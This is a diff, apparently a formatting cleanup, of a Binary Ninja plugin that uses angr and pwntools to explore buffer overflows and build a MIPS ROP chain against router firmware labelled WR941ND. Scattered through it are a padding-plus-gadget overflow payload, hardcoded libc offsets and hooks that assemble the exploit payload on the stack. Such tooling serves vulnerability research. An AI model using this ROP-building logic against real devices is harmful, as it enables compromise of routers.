@@ -19,13 +19,13 @@ import binascii
 from pwn import *
 
 registers = {"mips32": ['a0', 'a1', 'a2', 'a3', 's0', 's1',
-             's2', 's3', 's4', 's5', 's6', 's7',
-             't0', 't1', 't2', 't3', 't4', 't5',
-             't6', 't7', 't8', 't9', 'v0', 'v1',
-             'sp', 'gp', 'pc', 'ra', 'fp'],
+                        's2', 's3', 's4', 's5', 's6', 's7',
+                        't0', 't1', 't2', 't3', 't4', 't5',
+                        't6', 't7', 't8', 't9', 'v0', 'v1',
+                        'sp', 'gp', 'pc', 'ra', 'fp'],
              "armv7": ['r0', 'r1', 'r2', 'r3', 'r4', 'r5',
-             'r6', 'r7', 'r8', 'r9', 'r10', 'r11',
-             'r12', 'lr', 'sp', 'pc']}
+                       'r6', 'r7', 'r8', 'r9', 'r10', 'r11',
+                       'r12', 'lr', 'sp', 'pc']}
 
 
 class Explorer(ABC):
@@ -55,7 +55,6 @@ class MainExplorer(Explorer):
     @abstractmethod
     def set_sim_manager(self):
         pass
-    
 
 
 class UIPlugin(PluginCommand):
@@ -64,19 +63,19 @@ class UIPlugin(PluginCommand):
 
     def __init__(self):
         super(UIPlugin, self).register_for_address("Explorer\WR941ND\Start Address\Set",
-              "Set execution starting point address", self.set_start_address)
+                                                   "Set execution starting point address", self.set_start_address)
         super(UIPlugin, self).register("Explorer\WR941ND\Start Address\Clear",
-              "Clear starting point address", self.clear_start_address)
+                                       "Clear starting point address", self.clear_start_address)
         super(UIPlugin, self).register_for_address(
             "Explorer\WR941ND\End Address\Set", "Set execution end address", self.set_end_address)
         super(UIPlugin, self).register("Explorer\WR941ND\End Address\Clear",
-              "Clear end point address", self.clear_end_address)
+                                       "Clear end point address", self.clear_end_address)
         super(UIPlugin, self).register("Explorer\WR941ND\ROP\Shared Library\Select",
-                       "Try to build exploit rop chain", self.choice_menu)
+                                       "Try to build exploit rop chain", self.choice_menu)
         super(UIPlugin, self).register(
             "Explorer\WR941ND\Library\Set Library Path", "Add LD_PATH", self.set_ld_path)
         super(UIPlugin, self).register_for_address(
-            "Explorer\WR941ND\Function\Set Params","Add function params", self.set_function_params)
+            "Explorer\WR941ND\Function\Set Params", "Add function params", self.set_function_params)
         super(UIPlugin, self).register(
             "Explorer\WR941ND\Clear All", "Clear data", self.clear)
 
@@ -102,7 +101,7 @@ class UIPlugin(PluginCommand):
                 "Libraries", "project libraries", libs)
             binja.log_info("Selected library {0}".format(
                 mapped_libs[selected]))
-            BackgroundTaskManager.selected_opt =  mapped_libs[selected]
+            BackgroundTaskManager.selected_opt = mapped_libs[selected]
         except KeyError:
             UIPlugin.display_message(
                 'KeyException', "Library was not selected")
@@ -176,7 +175,7 @@ class UIPlugin(PluginCommand):
             BackgroundTaskManager.start_addr = self.start
         else:
             show_message_box("Plugin", "Start address not set !",
-                                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
+                             MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
             return
 
     def set_end_address(self, bv, addr):
@@ -190,17 +189,15 @@ class UIPlugin(PluginCommand):
                         addr, HighlightStandardColor.OrangeHighlightColor)
                     self.end = addr
                     BackgroundTaskManager.end_addr = self.end
-                    bv.set_default_session_data('end_addr', self.end)
                 else:
                     block.function.set_auto_instr_highlight(
                         addr, HighlightStandardColor.OrangeHighlightColor)
                     self.end = addr
                     BackgroundTaskManager.end_addr = self.end
-                    bv.set_default_session_data('end_addr', self.end)
             binja.log_info("End: 0x%x" % addr)
         except:
             show_message_box("Plugin", "Error please open git issue !",
-                                MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.ErrorIcon)
+                             MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.ErrorIcon)
 
     def clear_end_address(self, bv):
         if self.end:
@@ -210,29 +207,30 @@ class UIPlugin(PluginCommand):
             BackgroundTaskManager.end_addr = self.end
         else:
             show_message_box("Plugin", "End address not set !",
-                                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
+                             MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
             return
 
     @classmethod
     def display_message(self, title, desc):
-          show_message_box(title, desc,
-                                MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
+        show_message_box(title, desc,
+                         MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
 
     def generate_menu_text_fields(self, size):
         menu = ["Function Params"]
         for i in range(0, size):
-             text_field = interaction.TextLineField("Param {0}".format(i))
-             choice_pointer = interaction.ChoiceField("Pointer", ["No", "Yes"])
-             overflow_field = interaction.ChoiceField("Buffer Overflow", ["No", "Yes"])
-             menu.append(text_field)
-             menu.append(choice_pointer)
-             menu.append(overflow_field)
+            text_field = interaction.TextLineField("Param {0}".format(i))
+            choice_pointer = interaction.ChoiceField("Pointer", ["No", "Yes"])
+            overflow_field = interaction.ChoiceField(
+                "Buffer Overflow", ["No", "Yes"])
+            menu.append(text_field)
+            menu.append(choice_pointer)
+            menu.append(overflow_field)
         return menu
 
     def get_menu_results(self, menu_items, param_num):
         result = [x.result for x in menu_items]
         return [result[i*param_num:(i+1)*param_num] for i in range(len(result)//param_num)]
-        
+
     def convert_menu_results(self, results):
         keys = ['param', 'pointer', 'b_overflow']
         converted_list = []
@@ -240,13 +238,13 @@ class UIPlugin(PluginCommand):
             converted_list.append({keys[i]: item[i] for i in range(len(keys))})
         return converted_list
 
-     
     def set_function_params(self, bv, addr):
         func = bv.get_function_at(addr)
         if(func == None or type(func) != binja.function.Function):
-            self.display_message("Error", "This is not a function!" )
+            self.display_message("Error", "This is not a function!")
             return
-        binja.log_info("Function has {0} params".format(len(func.parameter_vars)))
+        binja.log_info("Function has {0} params".format(
+            len(func.parameter_vars)))
         menu_items = self.generate_menu_text_fields(len(func.parameter_vars))
         menu = interaction.get_form_input(menu_items, "Parameters")
         if menu:
@@ -254,7 +252,7 @@ class UIPlugin(PluginCommand):
             converted = self.convert_menu_results(results)
             print("Converted params", converted)
             BackgroundTaskManager.func_params = converted
-    
+
     @classmethod
     def clear(self, bv):
         UIPlugin.clear_color_path(bv)
@@ -263,7 +261,8 @@ class UIPlugin(PluginCommand):
         BackgroundTaskManager.func_params = {}
         BackgroundTaskManager.selected_opt = ''
         BackgroundTaskManager.ld_path = ''
-        
+
+
 class AngrRunner(BackgroundTaskThread):
     def __init__(self, bv, explorer):
         BackgroundTaskThread.__init__(
@@ -302,10 +301,10 @@ class BackgroundTaskManager():
         self.init = init
 
     @classmethod
-    def get_endianess(self,bv):
+    def get_endianess(self, bv):
         if bv.arch.endianness == 1:
             return 'big'
-        return 'little' 
+        return 'little'
 
     @classmethod
     def vuln_explore(self, bv):
@@ -316,9 +315,10 @@ class BackgroundTaskManager():
             params = BackgroundTaskManager.func_params
             if(start_addr == 0x0 or end_addr == 0x0):
                 UIPlugin.display_message(
-                  'TypeError', "Invalid or missing start_addr or end_addr")
+                    'TypeError', "Invalid or missing start_addr or end_addr")
                 return
-            print("BackgroundTaskManager start_addr: 0x{0:0x}, end_addr: 0x{1:0x}".format(start_addr, end_addr))
+            print("BackgroundTaskManager start_addr: 0x{0:0x}, end_addr: 0x{1:0x}".format(
+                start_addr, end_addr))
             self.vulnerability_explorer = VulnerabilityExplorer(
                 bv, BackgroundTaskManager.start_addr, BackgroundTaskManager.end_addr, ld_path=ld_path)
             binja.log_info("Session function params {0}".format(params))
@@ -330,9 +330,9 @@ class BackgroundTaskManager():
             self.runner = AngrRunner(bv, self.vulnerability_explorer)
             self.runner.start()
         except KeyError as e:
-              UIPlugin.display_message(
-                  'KeyError', "Missing definition of: {0}".format(e))
-              return
+            UIPlugin.display_message(
+                'KeyError', "Missing definition of: {0}".format(e))
+            return
 
     @classmethod
     def build_rop(self, bv):
@@ -343,7 +343,7 @@ class BackgroundTaskManager():
             ld_path = BackgroundTaskManager.ld_path
             if(start_addr == 0x0 or end_addr == 0x0 or ld_path == ''):
                 UIPlugin.display_message(
-                  'TypeError', "Invalid or missing start_addr or end_addr or lib path")
+                    'TypeError', "Invalid or missing start_addr or end_addr or lib path")
                 return
             print("BackrgoundTaskManager ld_path: {0}".format(ld_path))
             selected_opt = BackgroundTaskManager.selected_opt
@@ -360,7 +360,8 @@ class BackgroundTaskManager():
             self.sleep = self.libc_base + 0x00053ca0
 
             self.init = b"A"*160 + b"BBBB" + \
-                p32(self.gadget2, endian=endian)+p32(self.gadget1, endian=endian)
+                p32(self.gadget2, endian=endian) + \
+                p32(self.gadget1, endian=endian)
             self.rop_explorer = ROPExplorer(bv, self.proj, start_addr, end_addr, first=self.gadget1, second=self.gadget2,
                                             third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
 
@@ -391,7 +392,7 @@ class BackgroundTaskManager():
     def stop(self, bv):
         self.runner.cancel(bv)
 
-       
+
 class VulnerabilityExplorer(MainExplorer):
     def __init__(self, bv, func_start_addr, func_end_addr, ld_path=None, use_system_libs=False):
         self.bv = bv
@@ -428,23 +429,25 @@ class VulnerabilityExplorer(MainExplorer):
         if args is not None:
             for item in args:
                 if item['pointer'] == 1:
-                    self.args['arg'+str(counter)] = angr.PointerWrapper(item.get('param'))
+                    self.args['arg'+str(counter)
+                              ] = angr.PointerWrapper(item.get('param'))
                 else:
                     self.args['arg'+str(counter)] = item.get('param')
-                counter +=1
+                counter += 1
         return self.args
 
-    def get_endianess(self,bv):
+    def get_endianess(self, bv):
         if bv.arch.endianness == 1:
             return 'big'
         return 'little'
 
     def feed_function_state(self, args=None, data=None):
-        self.state = self.proj.factory.call_state(self.func_start_addr, args['arg0'])
+        self.state = self.proj.factory.call_state(
+            self.func_start_addr, args['arg0'])
         return self.state
-    
+
     def set_sim_manager(self, state):
-         self.simgr = self.proj.factory.simgr(self.state)
+        self.simgr = self.proj.factory.simgr(self.state)
 
     def check_buffer_overflow(self, params):
         if params:
@@ -452,18 +455,19 @@ class VulnerabilityExplorer(MainExplorer):
         counter = 0
         for item in params:
             if item['b_overflow'] == 1:
-                counter +=1
+                counter += 1
         if counter == 1:
             self.overflow = True
             return self.overflow
         elif counter > 1:
-            UIPlugin.display_message('Buffer Overflow Check', "Only one parameter could be check for Buffer Overflow")
-            self.overflow = False 
+            UIPlugin.display_message(
+                'Buffer Overflow Check', "Only one parameter could be check for Buffer Overflow")
+            self.overflow = False
             return self.overflow
         else:
-            self.overflow = False 
+            self.overflow = False
             return self.overflow
-    
+
     def find_pattern(self, params, pattern):
         for item in params:
             dest = item.get('param').encode()
@@ -517,9 +521,10 @@ class ROPExplorer(MainExplorer):
         self.func_start_addr = func_start_addr
         self.func_end_addr = func_end_addr
         self.proj = project
-        self.proj.analyses.CFGFast(regions=[(self.func_start_addr, self.func_end_addr)])
+        self.proj.analyses.CFGFast(
+            regions=[(self.func_start_addr, self.func_end_addr)])
         self.init = None
-        self.args={}
+        self.args = {}
         self.gadget1 = kwargs['first']
         self.gadget2 = kwargs['second']
         self.gadget3 = kwargs['third']
@@ -529,7 +534,7 @@ class ROPExplorer(MainExplorer):
         self.state_history = collections.OrderedDict()
         self.payload = collections.OrderedDict()
         self.endian = self.get_endianess(bv)
-    
+
         binja.log_info("Gadget 1 address: 0x{0:0x}".format(self.gadget1))
         binja.log_info("Gadget 2 address: 0x{0:0x}".format(self.gadget2))
         binja.log_info("Gadget 3 address: 0x{0:0x}".format(self.gadget3))
@@ -555,7 +560,7 @@ class ROPExplorer(MainExplorer):
         self.proj.hook(self.gadget3+16, self.hook_gadget3next16)
         self.proj.hook(self.gadget4, self.hook_gadget4)  # addiu $s0, $sp, 0x24
         self.proj.hook(self.gadget5+4, self.explore)  # jalr $
-        
+
     def set_args(self, **args):
         if args is not None:
             for key, value in args.items():
@@ -566,19 +571,20 @@ class ROPExplorer(MainExplorer):
                 else:
                     self.args[key] = value
         return self.args
-    
-    def get_endianess(self,bv):
+
+    def get_endianess(self, bv):
         if bv.arch.endianness == 1:
             return 'big'
         return 'little'
 
     def feed_function_state(self, args=None, data=None):
-        self.state = self.proj.factory.call_state(self.func_start_addr, args['arg0'])
+        self.state = self.proj.factory.call_state(
+            self.func_start_addr, args['arg0'])
         return self.state
-    
+
     def set_sim_manager(self, state):
-         self.simgr = self.proj.factory.simgr(self.state)
-    
+        self.simgr = self.proj.factory.simgr(self.state)
+
     def get_rop_report(self, state, data, gadget):
         contents = "==== 0x{0:0x} Registers ====\r\n\n".format(gadget)
         for reg in data:
@@ -589,7 +595,8 @@ class ROPExplorer(MainExplorer):
     def get_stack_report(self, data):
         contents = "====Stack Data ====\r\n\n"
         for key, value in data.items():
-            contents += "{0}: {1}\r\n\n".format(key.decode(),hex(u32(value, endian=self.endian)))
+            contents += "{0}: {1}\r\n\n".format(key.decode(),
+                                                hex(u32(value, endian=self.endian)))
         return contents
 
     def stack_adjust(self, state, reg, size, data="EEEE", vector_size=32):
@@ -616,7 +623,8 @@ class ROPExplorer(MainExplorer):
             self.stack_adjust(state, sp, 0x20, "EEEE")
             # lw $ra, 0x2c($sp)
             state.memory.store(sp+0x2c, state.solver.BVV(self.gadget3, 32))
-            self.payload[hex(sp+0x2c).encode()] = p32(self.gadget3, endian=self.endian)
+            self.payload[hex(sp+0x2c).encode()
+                         ] = p32(self.gadget3, endian=self.endian)
             self.state_history[hex(self.gadget2)] = state
 
     def hook_gadget2next4(self, state):
@@ -625,7 +633,8 @@ class ROPExplorer(MainExplorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x28($sp)
             state.memory.store(sp+0x28, state.solver.BVV(self.sleep, 32))
-            self.payload[hex(sp+0x28).encode()] = p32(self.sleep, endian=self.endian)
+            self.payload[hex(sp+0x28).encode()
+                         ] = p32(self.sleep, endian=self.endian)
 
     def hook_gadget2next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -649,7 +658,8 @@ class ROPExplorer(MainExplorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $ra, 0x24($sp)
             state.memory.store(sp+0x24, state.solver.BVV(self.gadget4, 32))
-            self.payload[hex(sp+0x24).encode()] = p32(self.gadget4, endian=self.endian)
+            self.payload[hex(sp+0x24).encode()
+                         ] = p32(self.gadget4, endian=self.endian)
 
     def hook_gadget3next8(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -665,7 +675,8 @@ class ROPExplorer(MainExplorer):
             sp = state.solver.eval(state.regs.sp, cast_to=int)
             # lw $s1, 0x1c($sp)
             state.memory.store(sp+0x1c, state.solver.BVV(self.gadget5, 32))
-            self.payload[hex(sp+0x1c).encode()] = p32(self.gadget5, endian=self.endian)
+            self.payload[hex(sp+0x1c).encode()
+                         ] = p32(self.gadget5, endian=self.endian)
 
     def hook_gadget3next16(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
@@ -758,9 +769,9 @@ class JSONExploitCreator(Explorer):
     def explore(self):
         pass
 
-    def decode_from_bytes(self,data):
+    def decode_from_bytes(self, data):
         decoded_dict = collections.OrderedDict()
-        for k,v in data.items():
+        for k, v in data.items():
             decoded_dict[k.decode()] = u32(v)
         return decoded_dict
 
